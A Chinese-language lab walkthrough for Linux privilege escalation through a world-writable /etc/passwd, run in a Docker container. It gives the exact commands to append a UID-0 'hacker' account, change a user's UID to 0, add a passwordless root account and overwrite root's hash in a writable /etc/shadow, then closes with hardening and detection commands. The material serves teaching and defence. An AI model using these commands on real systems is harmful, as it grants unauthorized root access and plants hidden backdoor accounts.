# /etc/passwd 可写提权

## 原理

/etc/passwd 每行格式：`用户名:密码占位:UID:GID:注释:家目录:shell`。正常情况密码
哈希在 /etc/shadow 里，passwd 中该字段为 x。当 /etc/passwd 对普通用户**可写**
（权限 666/777 或属主被改）时，直接追加一个 UID=0 的用户行（或把现有用户 UID
改成 0），即可用自己知道的密码登录 root 权限用户。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/etc/passwd 权限 666

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/passwd-writable        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it passwd-writable su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 确认权限
ls -l /etc/passwd
# 预期: -rw-rw-rw- (666, 可写!)

# 2. 生成密码哈希 (明文: 123456)
openssl passwd -1 -salt hacker 123456
# 预期: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 3. 追加 UID=0 用户
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' >> /etc/passwd

# 4. 登录新用户
echo 123456 | su hacker -c 'id'
# 预期: uid=0(root) gid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：理解 /etc/passwd 格式

每行 7 个字段，冒号分隔：
```
用户名:密码:UID:GID:注释:家目录:shell
root:x:0:0:root:/root:/bin/bash
```

- 现代系统密码哈希在 /etc/shadow 里，passwd 的密码字段只是占位符 `x`
- 但系统登录验证时：**如果 passwd 的密码字段不是 x，就使用该字段的值**
- UID=0 的用户 = root 权限

### 第二步：生成密码哈希

```bash
openssl passwd -1 -salt hacker 123456
# 预期: $1$hacker$6luIRwdGpBvXdP.GMwcZp/
```

`openssl passwd` 生成密码哈希：
- `-1` 表示 MD5-crypt 算法（$1$ 开头）
- `-salt hacker` 指定盐值（盐 = 防止相同密码产生相同哈希的随机串）
- 输出 `$1$<盐>$<哈希>` 就是可以直接写进 passwd 的格式

### 第三步：追加 UID=0 用户

```bash
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

| 字段 | 值 | 说明 |
|:---|:---|:---|
| 用户名 | hacker | 新用户 |
| 密码 | $1$hacker$... | 明文 123456 的哈希 |
| UID | 0 | **与 root 相同!** |
| GID | 0 | root 组 |
| 家目录 | /root | |
| shell | /bin/bash | 可登录 |

### 第四步：登录验证

```bash
su hacker        # 密码 123456
id               # uid=0(root) gid=0(root)
```

### 为什么 UID=0 就是 root

Linux 权限判断只看 UID 数字。hacker 的 UID 是 0，内核认为它就是 root——
不管用户名是什么。

### 变体

把已有用户行的 UID 从 1000 改成 0（不需要生成哈希）：
```bash
sed -i 's/^lowpriv:x:1000:/lowpriv:x:0:/' /etc/passwd
su lowpriv   # 密码不变, 登录后就是 root
```

为什么能成功

新用户 hacker 的 UID 是 0——与 root 相同！登录后 uid=0 即 root。
也可把已有用户（如 lowpriv）行的 UID 从 1000 改成 0，效果相同。

## 防御

- /etc/passwd 权限必须为 644（属主 root）
- 定期检查：stat -c '%a %U %n' /etc/passwd
- 监控 /etc/passwd 变更（auditd）


## 扩展教学（网络搜索整理）

### 为什么 passwd 里能放密码哈希（历史机制）

早期 Unix 密码就存在 /etc/passwd（世界可读），后来为了安全移到
/etc/shadow。**为了向后兼容**，PAM 认证逻辑是：
1. 如果 passwd 密码字段是 `x` → 去 /etc/shadow 找哈希
2. 如果 passwd 密码字段**本身就是哈希** → 直接用，不再查 shadow

这个"兼容回退"就是漏洞根基——写进 passwd 的哈希直接生效。

### 变体：空密码字段

历史上 passwd 第二字段为空 = 账户无密码（guest 账户），
如果系统允许空密码登录，甚至不用生成哈希：
```bash
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
su root2    # 直接进入, 无需密码
```
（现代 PAM 大多拒绝空密码，用哈希更可靠）

### 变体：/etc/shadow 可写（更隐蔽）

如果可写的是 shadow 而不是 passwd：
```bash
openssl passwd -1 -salt xyz P@ssw0rd123
# 生成: $1$xyz$8mE4v.gVR7sVKgN1olp5Y1
sed -i 's|^root:[^:]*:|root:$1$xyz$8mE4v.gVR7sVKgN1olp5Y1:|' /etc/shadow
su root    # 用新密码登录
```
不新增用户行，更隐蔽。

### 生成哈希的多种工具

```bash
openssl passwd -1 -salt xyz 密码       # MD5-crypt
openssl passwd -6 -salt xyz 密码       # SHA-512-crypt
mkpasswd -m sha-512 密码               # whois 包自带
perl -le 'print crypt("密码", "aa")'   # 老式 DES
```

### 检测（蓝队高信号）

```bash
# 1. 权限审计
stat -c '%a %U %G %n' /etc/passwd /etc/shadow   # 应为 644 root:root / 640 root:shadow

# 2. 新 UID-0 账户告警 (几乎零误报)
awk -F: '$3==0{print}' /etc/passwd
# 正常应只有 root 一行

# 3. 监控文件变更
auditctl -w /etc/passwd -p wa -k passwd_change
```

## 验证记录

2026-08-26 真实环境验证：追加 hacker 用户后 `su hacker`（密码 123456）
输出 `uid=0(root) gid=0(root) groups=0(root)`。复现成功。
